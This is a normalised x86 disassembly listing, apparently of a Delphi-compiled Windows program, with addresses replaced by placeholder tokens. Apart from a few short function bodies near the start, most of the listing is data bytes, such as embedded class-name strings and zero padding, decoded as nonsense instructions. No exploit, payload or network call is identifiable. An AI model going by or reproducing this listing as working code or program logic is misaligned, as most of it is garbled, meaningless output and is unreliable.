add esp 0xfffffff0
call sub_403404
call sub_405508
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_42f66c
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_42f698
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f706
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f70d
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4054f0
mov eax rw-data
call sub_4054f0
mov eax rw-data
call sub_4054f0
mov eax rw-data
call sub_403eb4
mov eax rw-data
call sub_4054f0
mov eax [ rw-data ]
call sub_42ecc8
sub_42f710
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f762
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f769
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f624
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4054f0
mov edx eax
mov eax [ rw-data ]
call sub_4237cc
sub_42f76e
inc edx
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
outsb
je r-xdata
insb
je r-xdata
sbb al 0x20
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
add [ eax + 0x43 ] ch
add [ ebx + esi ] bh
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x843391d
and [ ebx ] eax
clc
pop ds
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 2 - 0x8 ] si
inc edx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx * 2 - 0x8 ] si
inc edx
add ah dh
adc [ eax ] al
add [ eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
nop
inc eax
add [ eax - 0x8 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 8 + 0x42 ] ch
add [ eax + eax ] dh
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
jl r-xdata
add ah bl
stc
inc esp
jb r-xdata
add [ eax ] bl
inc ebx
add ah bl
and [ ebx ] al
mov [ eax ] fs
inc ebx
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
inc ebx
add [ ebx ] cl
push esp
inc esp
jb r-xdata
inc ebx
add ah dh
pop ds
inc ebx
add al bh
push ds
inc ebx
add [ esi + ebx + 0x43 ] bl
add [ esi + ebx + 0x20100043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] bl
inc ebx
add [ eax + 0x43 ] ch
add [ ebx + esi ] bh
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0xffffffffb4433879
push ds
inc ebx
add al bh
pop ds
inc ebx
add [ ecx + 0x43 ] dl
add al bh
push ds
inc ebx
add [ eax - 0x43ffbce0 ] dh
push ds
inc ebx
add [ eax + 0x21 ] ah
inc ebx
add [ eax ] dl
inc ebx
add [ eax + 0x43 ] ch
add [ ebx + esi ] bh
inc edx
add [ eax ] al
add [ eax ] al
mov al [ 0x280042f8 ]
xor eax [ eax ]
jl r-xdata
add [ eax ] al
fdiv st1
inc ebx
outsd
outsb
je r-xdata
add [ ebx + 0x42f8ecc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
stc
inc edx
add [ eax + eax ] bh
add [ eax ] al
cld
test [ edx ] sub_403328
jl r-xdata
inc ebx
add [ ecx + 0x43 ] dl
add al bh
push ds
inc ebx
add [ eax - 0x43ffbce0 ] dh
push ds
inc ebx
add [ eax + 0x21 ] ah
inc ebx
add [ eax ] dl
inc ebx
add [ eax - 0x23ffbcdf ] al
inc ebx
outsd
outsb
je r-xdata
inc eax
and [ ebx ] al
cmp al 0x33
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x34 ] si
stc
inc edx
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
inc ebx
add ah dh
pop ds
inc ebx
add al bh
push ds
inc ebx
add [ eax - 0x43ffbce0 ] dh
push ds
inc ebx
add [ eax ] dl
and [ ebx ] al
adc al 0x20
inc ebx
inc ebx
add [ eax - 0xbffbcdd ] al
pop ds
inc ebx
add al bh
push ds
inc ebx
add [ eax ] bh
and al [ ebx ]
mov esp 0x1000431e
inc ebx
outsd
outsb
je r-xdata
and [ ebx ] al
mov [ eax ] fs
inc ebx
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
and [ ebx ] al
and [ ecx ] 0x43
add ah bl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x3c ] si
cli
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6 ] ch
inc edx
add [ eax ] al
add [ eax ] al
stc
inc edx
add [ eax ] ch
xor eax [ eax ]
jl r-xdata
xor [ eax ] al
call 0x84339e1
and [ ebx ] eax
cmp al 0x21
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
inc esp
jb r-xdata
inc edx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx - 0x5 ] si
inc edx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 8 - 0x6 ] si
inc edx
add [ eax ] dh
stc
inc edx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
and [ ebx ] al
adc al 0x20
inc ebx
add [ eax ] bl
inc ebx
add [ edx + 0x21a40043 ] dl
inc ebx
add ah bl
and al [ ebx ]
pop eax
and eax [ ebx ]
insb
and eax [ ebx ]
mov [ ebx ] fs
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
int3
inc ebx
add [ eax + 0x3c004321 ] ah
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
call 0x8433a6d
and [ ebx ] eax
cmp al 0x21
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
inc ebx
outsd
outsb
je r-xdata
inc ebx
add ah dh
pop ds
inc ebx
add al bh
push ds
inc ebx
add [ eax ] bh
and al [ ebx ]
mov esp 0x1000431e
and [ ebx ] al
adc al 0x20
inc ebx
inc ebx
add [ ebx + 0x333c0043 ] dl
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
or [ edx ] ah
inc ebx
add [ eax ] cl
and [ ebx ] eax
and [ ebx ] 0x43
add [ eax ] bl
inc ebx
add [ edx + 0x21a40043 ] dl
inc ebx
add ah bl
and al [ ebx ]
pop eax
and eax [ ebx ]
insb
and eax [ ebx ]
mov [ ebx ] fs
inc ebx
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 8 - 0x8 ] si
inc edx
add [ eax - 0x8 ] bh
inc edx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ecx
add [ eax + eax * 2 ] ch
inc ecx
add [ eax ] bl
fld [ ecx ]
add al 0xdd
inc ecx
add [ eax + 0xe004335 ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
sub al 0xfc
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4 ] bl
add [ eax ] ch
xor eax [ eax ]
jl r-xdata
add [ ebx + 0x42fb90c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
sti
inc edx
add [ eax ] dh
add [ eax ] al
cmp dl 0x42
inc ebx
add [ eax - 0x23ffbcdf ] al
and [ ebx ] al
mov [ eax ] fs
inc ebx
add [ edx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebp - 0x64fffc0 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
jae r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 8 + 0x42 ] al
add [ eax + eax ] ah
add [ eax - 0x46 ] dl
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
xor eax 0x41100043
inc ecx
add [ eax ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
cld
pop eax
cld
inc edx
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add ah dh
cmp [ ebx ] eax
mov al [ 0xffffffffa00041a5 ]
cmp al [ ebx ]
inc ecx
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
cmp [ ebp + 0x37d40041 ] ah
inc ebx
add [ ebp + 0x41 ] ch
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3 ] cl
inc edx
add [ eax + eax ] bl
add [ eax ] al
je r-xdata
cld
inc edx
add [ edx + edi * 4 + 0x40041 ] bh
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
cmp [ ebx ] dh
inc eax
add [ ebx + esi ] bh
inc esp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
inc ecx
add al ah
cmp [ ebx ] al
mov esp 0x5400440d
cmp [ ebx ] eax
in al 0xd
inc esp
add al bh
or eax 0x3acc0044
inc ebx
add [ eax + 0x34004339 ] cl
push cs
inc esp
add [ eax + 0xe ] cl
inc esp
add al al
cmp [ ebx ] eax
jo r-xdata
outsd
insb
jae r-xdata
or [ esi ] 0x44
add [ eax + 0x3b ] dl
inc ebx
add [ eax ] dh
cmp eax [ ebx ]
jo r-xdata
inc esp
add [ edx + edi ] bl
inc ebx
add [ eax + 0xe ] bh
inc esp
add [ edx + edi ] bh
inc ebx
add [ eax + 0x5000440e ] al
cmp eax [ ebx ]
xor [ ebx ] bh
inc ebx
add [ eax + 0x3b ] dh
add [ ebp - 0x333ffc0 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebp + edi * 8 + 0x42 ] bl
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
inc ebx
add [ edx + edi + 0x43 ] bl
add [ esi + ecx + 0xe980044 ] dl
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x42fd6090
add [ ebx ] al
or al 0x54
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
add [ esi + edi * 8 ] ah
inc edx
add [ esi ] al
outsd
insd
popad
je r-xdata
inc edx
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
inc eax
add ah cl
inc [ edx ]
push es
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc edx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
inc esp
add [ eax - 0xfffbcc6 ] al
aaa
inc ebx
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
push cs
std
inc edx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
inc ebx
add [ eax - 0x6fffbd02 ] eax
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al bl
std
inc edx
add [ ebx ] cl
jae r-xdata
pop esp
inc [ edx ]
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
jpe r-xdata
imul ebp [ edi + 0x6e ] 0xfe84c08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
sub dh bh
inc edx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
insb
dec ebp
popad
loopne r-xdata
inc edx
add [ ecx ] al
andps xmm0 [ ebx + 0x6f ]
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
inc [ edx ]
push es
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
rcr ah 0xfd
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
inc ebx
add [ eax + 0x10004336 ] dh
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
add eax 0x0
outsb
jae r-xdata
inc edx
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
imul ebp [ esi + 0x64 ] 0x1
inc edx
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
test dh bh
or [ ebx + 0x6f ] al
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
inc [ edx ]
pop es
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
inc edx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
inc ebp
outsb
je r-xdata
inc eax
add [ eax ] bh
xor eax [ eax ]
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] al
add [ eax + 0x60042fe ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
adc [ eax ] al
add bh bh
xor al 0x37
inc [ edx ]
inc [ edx ]
adc al 0x0
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
xor al 0x37
inc ebx
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] bl
inc ecx
inc ecx
add [ eax + eax * 2 ] ch
inc ecx
add al al
aaa
imul ebp [ esi + 0x74 ] 0x657a6953
jb r-xdata
jb r-xdata
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
add [ eax + 0x41 ] al
add ah ch
outsd
insb
add [ ecx ] al
add [ eax ] al
add [ ebp + edi * 8 + 0x64080042 ] bl
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add [ eax ] ch
inc [ edx ]
add ecx [ ecx ]
push esp
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x4300a8c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
fdiv st6
inc edx
add [ eax ] dl
add [ eax ] al
push [ edi + esi ]
add bh bh
xor al 0x37
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
xor [ eax ] al
inc ebx
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x42fedc74
jb r-xdata
popad
js r-xdata
jb r-xdata
jae r-xdata
jb r-xdata
outsb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
push ebx
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
imul ebp [ esi + 0x74 ] 0x42ff4873
add ah bh
push ss
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
add ah dh
adc [ eax ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
add [ eax + eax ] dl
inc edx
outsd
insb
jae r-xdata
dec esp
popad
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add ah dh
adc [ eax ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
push [ edi + esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add ah bl
inc [ edx ]
or [ eax ] al
add bh bh
xor al 0x37
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
hlt
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
push 0x70004010
cmovno eax [ eax ]
nop
pop eax
add [ ebx ] eax
or [ esi ] cl
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x42fedc74
imul esp [ gs : edi + 0x68 ] 0x42fedc74
add [ eax + eax ] cl
add bh bh
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add al bl
std
inc edx
add [ eax ] al
adc [ eax ] al
nop
sbb al 0x2
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
outsb
je r-xdata
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
hlt
add [ eax - 0x8 ] bh
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
inc esp
jb r-xdata
hlt
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
jb r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add ah dh
adc [ eax ] al
sub [ eax ] dl
inc eax
add [ ebp + 0x1940040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xf4007261
adc [ eax ] al
pop es
inc edx
outsd
outsd
insb
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x27c0040 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
jbe r-xdata
je r-xdata
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
pop es
dec ecx
outsb
je r-xdata
inc esp
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
outsb
je r-xdata
hlt
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] ah
add eax [ ebx ]
or [ esi ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
js r-xdata
push ebx
outsb
add al 0x8
push es
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
hlt
hlt
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
inc edx
add ah al
add al [ ebx ]
or [ 0x646e4554 ] cl
inc esp
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
inc esp
outsd
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
jbe r-xdata
inc ebp
jbe r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ ebx + 0x43055cc0 ] cl
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
pop esp
add eax 0xf080043
push esp
inc ebx
popad
jo r-xdata
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
inc ebx
jpe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
sbb bl bh
inc edx
add al dl
add al 0x43
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
